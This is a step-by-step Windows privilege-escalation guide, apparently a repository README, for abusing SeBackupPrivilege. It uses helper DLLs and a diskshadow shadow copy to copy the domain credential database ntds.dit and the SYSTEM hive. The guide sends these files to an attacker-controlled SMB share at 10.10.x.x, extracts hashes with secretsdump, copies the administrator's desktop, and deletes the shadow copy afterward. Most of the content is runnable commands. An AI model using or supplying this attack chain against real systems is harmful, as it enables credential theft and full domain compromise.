# SeBackupPrivilege

If you've SeBackupPrivilege. We can use that privilege to read and get any file from the target machine. If we attack SAM, SYSTEM or ntds.dit some important files we can beacome SYSTEM.


# Exploitation

First upload [SeBackupPrivilegeCmdLets.dll](https://github.com/k4sth4/SeBackupPrivilege/blob/main/SeBackupPrivilegeCmdLets.dll) and [SeBackupPrivilegeUtils.dll](https://github.com/k4sth4/SeBackupPrivilege/blob/main/SeBackupPrivilegeUtils.dll) to target machine.

### Import he DLLs
```markdown
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```

### Create a vss.dsh file
```markdown
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```
NOTE: c:\\programdata is the writeable path where you i have upload dll and creating a test.cab

### Change the file format
```markdown
unix2dos vss.dsh
```

upload the file on C:\\programdata 

### Use diskshadow to explore the func of copy
```markdown
diskshadow /s c:\\programdata\\vss.dsh
```

### Now you can copy any file 
Copy any file to present dir and then download it to your system.

We gonna get ntds.dit and system.
```markdown
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
```
Now system file
```markdown
reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
```
Now we can see that both ntds.dit and SYSTEM files are in our present dir.
You can also get other sensetive files like SAM, SYSTEM, SECURITY.

### Download these files using smb server.
```markdown
smbserver.py k4sth4 . -smb2support -username kt -password kt
net use \\10.10.x.x\k4sth4 /u:kt kt
```
```markdown
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit \\10.10.x.x\k4sth4\ntds.dit
reg.exe save hklm\system \\10.10.x.x\system
```

### Now extract the hashes from ntds.dit with SYSTEM as key
```markdown
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### We can also Dump the whole administrator dir into Temp
```markdown
robocopy /b C:\\users\\administrator\\desktop C:\\programdata\\temp
```
We get all the desktop files in temp dir.


### Now after doing this CleanUp is necessary

### cleanUp script vss.dsh
```markdown
set context persistent nowriters
set metadata c:\\programdata\\test.cab
set verbose on
delete shadows volume test
reset
```
```markdown
unix2dos vss.dsh
```

### upload and run
```markdown
diskshadow /s c:\\programdata\\vss.dsh
```



